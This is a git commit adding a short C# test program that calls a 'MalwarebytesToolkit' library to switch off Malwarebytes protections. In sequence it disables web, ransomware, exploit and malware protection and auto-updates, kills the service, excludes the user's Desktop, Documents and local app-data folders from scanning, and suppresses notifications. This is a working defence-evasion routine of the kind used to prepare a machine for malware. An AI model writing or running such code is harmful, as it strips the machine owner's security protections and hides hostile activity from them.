7dfbe1d929af5940d6ae4178ca29acd73d742cbe
miltinhoc <miltinhoc@users.noreply.github.com>
2024-10-02 17:38:19 +0000

    Add project files.

---
+++ Tester/Program.cs
@@ -0,0 +1,32 @@
+﻿using MalwarebytesToolkit.Manager;
+using MalwarebytesToolkit.Enums;
+using System;
+
+namespace Tester
+{
+    internal class Program
+    {
+        static void Main(string[] args)
+        {
+            MalwarebytesManager manager = new MalwarebytesManager();
+            manager.DisableWebProtection();
+            manager.DisableRansomwareProtection();
+            manager.DisableExploitProtection();
+            manager.DisableMalwarePUPProtection();
+            manager.DisableAutoUpdates();
+
+            manager.KillService();
+
+            string[] paths = new string[]
+            {
+
+                Environment.GetFolderPath(Environment.SpecialFolder.Desktop),
+                Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments),
+                Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData)
+            };
+
+            manager.AddExclusion(ExclusionType.Folder, paths);
+            manager.RemoveNotifications();
+        }
+    }
+}
